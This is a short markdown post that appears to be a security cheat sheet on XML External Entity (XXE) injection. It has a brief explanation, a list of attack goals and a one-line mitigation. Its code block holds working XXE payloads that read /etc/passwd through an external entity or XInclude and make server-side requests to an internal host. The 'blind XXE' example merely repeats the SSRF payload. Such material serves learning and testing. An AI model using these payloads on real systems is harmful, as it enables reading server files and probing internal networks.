---
title: 'XML External Entity Injection (XXE)'
description: "Allows an attacker to interfere with an application's processing of XML data."
pubDate: 'Jul 08 2022'
heroImage: '/xxe.jpeg'
---

### Information

The DTD (Document Type Definition) is used to validate the structure of an XML file and may contain references to external resources, such as files on the server system.

### How to Attack

- SSRF
- PHP Object Injection (through phar://)
- XSS/CSRF
- Local File Disclosure
- RCE
- Local Port Scanning‌

```html
<!-- Retrieve files -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

<!-- SSRF attacks -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable_site.com/"> ]>

<!-- Blind XXE -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable_site.com/"> ]>

<!-- XInclude attacks -->

<!-- XInclude is a part of the XML specification that allows an XML document to be built from sub-documents -->

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

<!-- Modified content type -->
<!-- POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52 -->

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>

```

### How to protect

The application's XML parsing library supports potentially dangerous XML features that the application does not need, disable those thins.
